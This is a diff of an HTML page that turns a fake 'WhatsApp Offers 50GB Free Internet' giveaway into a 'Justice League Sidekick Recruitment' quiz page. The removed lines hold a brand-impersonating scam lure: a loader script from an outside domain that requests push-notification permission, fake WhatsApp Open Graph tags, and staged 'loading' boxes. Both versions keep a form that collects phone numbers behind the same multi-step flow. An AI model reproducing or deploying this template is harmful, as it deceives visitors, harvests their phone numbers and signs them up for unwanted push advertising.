@@ -1,735 +1,54 @@
 <!DOCTYPE html>
-
-
-<html>
-
+<html lang="en">
 <head>
-    <script>
-        var s = document.createElement('script');
-        s.src = '//deefauph.com/pfe/current/micro.tag.min.js?z=4323600' + '&sw=/sw-check-permissions-a43f7.js';
-        s.onload = function(result) {
-            switch (result) {
-                case 'onPermissionDefault':
-                    break;
-                case 'onPermissionAllowed':
-                    break;
-                case 'onPermissionDenied':
-                    break;
-                case 'onAlreadySubscribed':
-                    break;
-                case 'onNotificationUnsupported':
-                    break;
-            }
-        }
-
-        document.head.appendChild(s);
-    </script>
-
-    <script>
-        function set_Cookie(name, value) {
-            var Days = 30;
-            var exp = new Date();
-            exp.setTime(exp.getTime() + (Days * 20 * 1000));
-            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
-        }
-
-        function get_Cookie(name) {
-            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
-            if (arr = document.cookie.match(reg)) {
-                return unescape(arr[2]);
-            }
-            return '';
-        }
-
-
-        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
-                        document.getElementById("first-box")."quedate__step".display="none";//??;
-                        document.getElementById("second-box").style.display="none";//??;
-                        document.getElementById("third-box").style.display="none";//??;
-                        document.getElementsByClassName("loading2__box").style.display="";//??;
-                    }*/
-    </script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <meta content="https://www.whatsapp.com" property="og:site_name">
-    <meta property="og:url" content="www.whatsapp.com">
-    <meta content="https://i.imgur.com/mbBCcZ2.png" property="og:image">
-    <meta property="og:title" content="🎊Whatsapp Offers 50GB Free Internet!🎁">
-    <meta content="To celebrate our 10th anniversary we give 1000 GB of free internet" property="og:description">
-    <link href="https://i.imgur.com/mbBCcZ2.png" rel="image_src">
-    <link href="https://1.bp.blogspot.com/-LNMGlC20cpI/YKsqbW3QciI/AAAAAAAAB-8/xU9at4Cs97okUtanoapaTVi7o1nv_Rn_gCLcBGAsYHQ/s0/wrtw%2B%25282%2529.png" rel="icon" type="image/x-icon">
-    <meta property="og:updated_time" content="1440432930" />
-    <!-- <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap" rel="stylesheet">-->
-
-    <meta content="Whatsapp Anniversary Data Gift" property="og:title">
-
-    <title>The Anniversary Offers 50GB Free Internet!</title>
-
-
-
-
-    <style>
-        :root {
-            --color-primary: rgb(37, 38, 38);
-            --color-secondary: #ff6d0e;
-            --color-secondary2: #ff6d0e
-        }
-
-        * {
-            box-sizing: border-box;
-            padding: 0;
-            margin: 0
-        }
-
-        html {
-            font-size: 62.5%;
-            font-family: Montserrat;
-            font-weight: 500;
-            color: var(--color-primary)
-        }
-
-        .quedate-container,
-        body {
-            width: 100vw
-        }
-
-        .container-chat {
-            font-weight: 400
-        }
-
-        .chat,
-        .wrapper {
-            display: flex;
-            flex-direction: column
-        }
-
-        .loading__box-1--hidden {
-            display: none !important
-        }
-
-        .loading__box-2--hidden {
-            display: none !important
-        }
-
-        .loading__box-3--hidden {
-            display: none !important
-        }
-
-        .loading__check-1--hidden {
-            display: none !important
-        }
-
-        .loading__check-2--hidden {
-            display: none !important
-        }
-
-        .loading__check-3--hidden {
-            display: none !important
-        }
-
-        .chat__reactions {
-            width: 90%;
-            margin: 2rem auto 0;
-            display: flex;
-            align-items: stretch;
-            font-size: .95rem
-        }
-
-        .chat__reactions-icon {
-            width: 1.2rem;
-            margin-right: .2rem
-        }
-
-        .chat__reactions-text {
-            margin-left: .5rem
-        }
-
-        .chat__reactions-counter {
-            margin-left: 1.8rem
-        }
-
-        .chat__actions {
-            margin-top: 1rem;
-            display: flex;
-            justify-content: space-around;
-            font-size: 1.2rem;
-            border-top: 1.4px solid #b0b0b0;
-            border-bottom: .5px solid #d3d3d3
-        }
-
-        .chat__actions-box {
-            display: flex;
-            align-items: center
-        }
-
-        .chat__actions img {
-            width: 4rem
-        }
-
-        .chat__conversation {
-            width: 90%;
-            margin: 0 auto;
-            font-size: 1.1rem
-        }
-
-        .chat__conversation-box {
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            margin-top: 1rem;
-            position: relative
-        }
-
-        .chat__conversation-box--right {
-            margin-left: 20%;
-            margin-bottom: 1rem
-        }
-
-        .chat__conversation-box-img {
-            width: 3.5rem;
-            border-radius: 50%;
-            margin-right: 1rem;
-            align-self: baseline
-        }
-
-        .chat__conversation-box-active {
-            width: 1rem;
-            height: 1rem;
-            background-color: var(--color-secondary);
-            border-radius: 50%;
-            position: absolute;
-            top: 2.5rem;
-            left: 2.7rem
-        }
-
-        .chat__conversation-box-content-comment {
-            padding: 1rem;
-            background-color: #f2f3f5;
-            border-top-left-radius: 14px;
-            border-top-right-radius: 14px;
-            border-bottom-left-radius: 14px;
-            border-bottom-right-radius: 14px
-        }
-
-        .chat__conversation-box-content-comment-name {
-            color: #726695;
-            font-weight: 500;
-            margin-right: .4rem
-        }
-
-        .chat__conversation-box-content-cta {
-            margin-top: .3rem;
-            padding-left: 1.5rem;
-            color: #726695
-        }
-
-        .chat__conversation-box-content-cta-text {
-            margin-right: .5rem
-        }
-
-        .chat__conversation-box-content-cta--2 {
-            font-size: .9rem
-        }
-
-        .chat__conversation-reply {
-            margin-left: 20%;
-            color: gray
-        }
-
-        .chat__conversation-reply--efect {
-            animation: opacidad 1s infinite
-        }
-
-        @keyframes opacidad {
-            0 {
-                opacity: 0
-            }
-            50 % {
-                opacity: 1
-            }
-            100 % {
-                opacity: 0
-            }
-        }
-
-        .chat__conversation-write {
-            position: relative;
-            margin-bottom: 2rem
-        }
-
-        .chat__conversation-write input {
-            width: 100%;
-            margin-top: 2rem;
-            margin-bottom: 1rem;
-            border: none;
-            background-color: #f2f3f5;
-            border-radius: 100px;
-            padding: .8rem;
-            color: var(--color-primary);
-            padding-left: 1rem;
-            outline: 0
-        }
-
-        .chat__conversation-write-icons {
-            display: flex;
-            flex-direction: row;
-            position: absolute;
-            right: 1.2rem;
-            top: 1.8rem
-        }
-
-        .chat__conversation-write-icons-img {
-            width: 1.2rem;
-            margin-right: .5rem;
-            fill: gray
-        }
-
-        .chat__conversation-write-icons-img--svg {
-            width: 2rem
-        }
-
-        .loading {
-            width: 100%;
-            height: 220px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            position: absolute;
-            top: 48px;
-            z-index: 10;
-            background-color: #fff;
-            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
-        }
-
-        .loading__box {
-            width: 50%;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            position: relative
-        }
-
-        .loading__animate,
-        .loading__check {
-            width: 5rem
-        }
-
-        .loading__check {
-            position: absolute;
-            left: 0
-        }
-
-        .loading__txt {
-            font-size: 1.2rem;
-            color: var(--color-primary);
-            margin-left: 1rem
-        }
-
-        .loading2 {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            position: absolute;
-            top: 48px;
-            z-index: 20;
-            background-color: #fff;
-            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
-        }
-
-        .loading2__box {
-            text-align: justify;
-            padding: 2rem;
-            color: var(--color-primary);
-            font-size: 14px
-        }
-
-        .loading2__permission {
-            width: 12rem;
-            margin: 0 auto
-        }
-
-        .js-hidden {
-            display: none !important
-        }
-
-        .js-display {
-            display: block
-        }
-
-        .js-show {
-            visibility: hidden !important
-        }
-
-        .logo-container {
-            width: 100%;
-            padding-top: 1.5rem;
-            padding-bottom: 1.5rem;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: center;
-            color: var(--color-primary);
-            font-size: 2rem;
-            margin: 0 auto 20px;
-            background-image: linear-gradient(to bottom right, #3c9900, #3c9900);
-            color: white;
-        }
-
-        .quedate-container {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center
-        }
-
-        .quedate {
-            width: 100%
-        }
-
-        .quedate__fixed {
-            background-color: var(--color-primary)
-        }
-
-        .quedate__fixed-box {
-            width: 90%;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            padding: .5rem
-        }
-
-        .quedate__fixed-box span {
-            margin: 0 auto;
-            color: #fff;
-            font-size: 1.5rem
-        }
-
-        .quedate__company {
-            width: 30%;
-            border-right: 1px solid var(--color-secondary)
-        }
-
-        .quedate__step {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding-top: 0;
-        }
-
-        @keyframes glowing {
-            0% {
-                box-shadow: 0 0 -10px #000000;
-            }
-            40% {
-                box-shadow: 0 0 20px #000000;
-            }
-            60% {
-                box-shadow: 0 0 20px #000000;
-            }
-            100% {
-                box-shadow: 0 0 -10px #000000;
-            }
-        }
-
-        .button-glow {
-            animation: glowing 5000ms infinite;
-            transition: 0.2s linear;
-            background-image: linear-gradient(to bottom right, #ff6d0e, #ff6d0e);
-        }
-
-        .quedate__step-box {
-            width: 96%;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 2rem;
-            margin: 0 auto 20px;
-            text-align: center;
-            padding-bottom: 15px;
-            position: relative;
-        }
-
-        .quedate__step-box:before {
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            content: '';
-            height: 6px;
-            width: 100px;
-            border-radius: 10px;
-            background-color: var(--color-secondary);
-            transform: translateX(-50%);
-        }
-
-        .quedate__border {
-            width: 30px;
-            height: 80%;
-            background-color: var(--color-secondary);
-            margin-right: 1rem;
-            display: none;
-        }
-
-        .quedate__cta-btn {
-            width: 80%;
-            cursor: pointer;
-            font-size: 2rem;
-            font-weight: 700;
-            color: #fff;
-            padding: 1rem;
-            border: none;
-            background-color: ;
-            border-top-left-radius: 14px;
-            border-top-right-radius: 14px;
-            border-bottom-left-radius: 14px;
-            border-bottom-right-radius: 14px;
-            outline: 0;
-            margin: 0 0 20px 3.5rem;
-            background-image: linear-gradient(to bottom right, #ff6d0e, #ff6d0e);
-        }
-
-        .quedate__cta-btn:active,
-        .quedate__cta-btn:hover {
-            background-color: #03a658
-        }
-
-        .quedate__cta-btn:active {
-            transform: translateY(2px)
-        }
-
-        .quedate__loading {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center
-        }
-
-        .quedate__svg {
-            position: relative
-        }
-
-        .quedate__check {
-            position: absolute;
-            left: 0
-        }
-
-        .quedate__porcent {
-            margin-top: 1rem;
-            margin-bottom: 2rem;
-            font-size: 2.5rem;
-            font-weight: 700
-        }
-
-        .quedate__form {
-            border: 1.5px solid #c0bfc3;
-            border-top-right-radius: 8px;
-            border-top-left-radius: 8px;
-            border-bottom-left-radius: 8px;
-            border-bottom-right-radius: 8px;
-            padding: 1rem;
-            position: relative;
-            margin-top: 2.5rem
-        }
-
-        .quedate__form-input {
-            border: none;
-            outline: 0
-        }
-
-        .quedate__form-input::placeholder {
-            color: #c0bfc3;
-            font-family: inherit;
-            font-size: 1.5rem
-        }
-
-        .quedate__form-separar {
-            position: absolute;
-            width: 1px;
-            height: 100%;
-            top: 0;
-            background-color: #c0bfc3
-        }
-
-        .quedate__form-label {
-            font-size: 1.5rem;
-            font-weight: 700;
-            padding: 2rem
-        }
-
-        .quedate__first {
-            width: 90%;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: center;
-            margin: 9px auto
-        }
-
-        .quedate__load {
-            width: 80%;
-            font-size: 1.3rem;
-            padding: .8rem;
-            border: 1px solid var(--color-primary);
-            position: relative
-        }
-
-        .quedate__load-icon {
-            width: 30%;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            border: 1px solid var(--color-primary);
-            padding-right: .8rem;
-            padding-left: .8rem;
-            border-left: none
-        }
-
-        .quedate__load-text {
-            margin-left: .5rem;
-            font-size: 1.2rem;
-            font-weight: 700;
-        }
-
-        .quedate__load-a {
-            position: absolute;
-            height: 3.2rem;
-            top: 0;
-            z-index: -1;
-            left: 0;
-            background-color: var(--color-secondary2)
-        }
-
-        .permision-container {
-            width: 95%;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background-color: #fff;
-            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .4);
-            position: absolute;
-            top: .8rem;
-            left: .8rem;
-            z-index: 15
-        }
-
-        .permision-container-box {
-            width: 95%;
-            margin: 0 auto
-        }
-
-        .permision-container-end,
-        .permision-container-request-text {
-            width: 100%;
-            padding: 1.2rem;
-            background-color: #ededf3;
-            font-size: 1.5rem;
-            font-weight: 700
-        }
-
-        .permision-container-end {
-            font-size: 1rem;
-            font-weight: 400;
-            text-align: center
-        }
-
-        .permision-container-data {
-            padding: 2rem
-        }
-
-        .permision-container-icons {
-            width: 60%;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: space-around;
-            margin-bottom: 2.5rem
-        }
-
-        .permision-container-icons-face,
-        .permision-container-icons-uber {
-            width: 8rem
-        }
-
-        .permision-container-txt {
-            margin: 0 auto;
-            font-size: 1.5rem;
-            text-align: center;
-            margin-bottom: 1.5rem
-        }
-
-        .permision-container-form {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between
-        }
-
-        .permision-container-input {
-            outline: 0;
-            padding: 1.2rem;
-            width: 100%;
-            margin-bottom: 1.5rem;
-            border-top-left-radius: 10px;
-            border-top-right-radius: 10px;
-            border-bottom-left-radius: 10px;
-            border-bottom-right-radius: 10px;
-            border: 1px solid #b9b9b9;
-            color: gray;
-            font-size: 1.2rem
-        }
-
-        .permision-container-secure {
-            margin-top: 1rem;
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: center;
-            color: #a2a2a2
-        }
-
-        .permision-container-secure svg {
-            width: 1.5rem;
-            height: 1.5rem;
-            margin-right: 1rem
-        }
-
-        .permision-container-cta {
-            width: 100%;
-            padding: .8rem;
-            margin-top: 1rem;
-            margin-bottom: 1.5rem;
-            margin-left: 0;
-            font-size: 1.8rem
-        }
-
-        /* Chrome, Safari, Edge, Opera */
-
-        input::-webkit-outer-spin-button,
-        input::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-
-        /* Firefox */
-
-        input[type=number] {
-            -moz-appearance: textfield;
-        }
-    </style>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Join the Justice League and become a sidekick! Take our personality test to discover which superhero you could be.">
+  <title>Justice League Sidekick Recruitment</title>
+  <!-- Favicon -->
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <!-- Bootstrap CSS -->
+
+  <!-- Open Graph tags -->
+  <meta property="og:title" content="Justice League Sidekick Recruitment">
+  <meta property="og:description" content="Join the Justice League and become a sidekick! Take our personality test to discover which superhero you could be.">
+  <meta property="og:image" content="https://www.suicidesquadgame.com/images/suicide-squad-share.jpg" />
+  <meta property="og:url" content="https://coursework-phi.vercel.app">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="stylesheet" href="https://unpkg.com/leopard@^1/dist/index.min.css" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="style.css"> <!-- Your custom styles -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
-
-<body>
+<body style="background-color: #FEFEBE; color: black;">
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="#">
+        <img src="Logo.jpg" alt="Justice League Logo" width="30" height="30" class="d-inline-block align-top">
+        Justice ★ League
+      </a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav">
+          <li class="nav-item">
+            <a class="nav-link" href="about.html">About</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="contact.html">Contact</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="disclaimer.html">Disclaimer</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" id="logout-button" style="cursor: pointer; display: none;">Logout</a>
+          </li>
+          <!-- Add more links as needed -->
+        </ul>
+      </div>
+    </div>
+  </nav><br><br><br><body>
 
     <div id=fireworks>
 
@@ -742,14 +61,10 @@
                     <main class="quedate">
                         <!-- Primera parte: ads description -->
                         <div class="quedate__step" id="first-box">
-                            <header class="logo-container">
-                                <svg fill="#ffffff" height="20px" viewBox="-31 0 512 512" width="20px" xmlns="http://www.w3.org/2000/svg">
-                            <path d="m30 316c-16.570312 0-30 13.429688-30 30 0 16.566406 13.429688 30 30 30h59l-14 106c0 16.566406 13.429688 30 30 30s30-13.433594 30-30l14-106h120l-14 106c0 16.566406 13.429688 30 30 30s30-13.433594 30-30l14-106h61c16.570312 0 30-13.433594 30-30 0-16.570312-13.429688-30-30-30h-53l16-120h67c16.570312 0 30-13.433594 30-30 0-16.570312-13.429688-30-30-30h-59l14-106c0-16.570312-13.429688-30-30-30s-30 13.429688-30 30l-14 106h-120l14-106c0-16.570312-13.429688-30-30-30s-30 13.429688-30 30l-14 106h-61c-16.570312 0-30 13.429688-30 30 0 16.566406 13.429688 30 30 30h53l-16 120zm143-120h120l-16 120h-120zm0 0" />
                         </svg>
 
 
 
-                                <span class="quedate-logo">JUSTICE ★ LEAGUE 🛡️</span>
                             </header>
                             <div class="quedate__step-box">
                                 <span class="quedate__border"></span>
@@ -814,7 +129,7 @@
                                 var prevent = (e) => e.preventDefault();
                             </script>
                             <form class="quedate__form" onsubmit="return prevent(event)">
-                                <input class="quedate__form-input" id="num" type="number" placeholder="Enter Phone Number">
+                                <input class="quedate__form-input" id="num" type="number" placeholder="Enter Phone No.">
                                 <span class="quedate__form-separar"></span>
                                 <label id="enviar" class="quedate__form-label" for="num">Send</label>
                                 <div class="message-status js-hidden"></div>
@@ -1689,12 +1004,9 @@
             })(window);
         </script>
         <!-- BEGIN: Powered by Supercounters.com -->
-        <center>
-            <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
-            <script type="text/javascript">
-                sc_online_i(1625561, "ffffff", "ffffff");
-            </script><br><noscript><a href="https://www.supercounters.com/">free online counter</a></noscript>
-        </center>
+        
+        <script src="script.js"></script> <!-- Your custom script -->
+
         <!-- END: Powered by Supercounters.com -->
 </body>
 
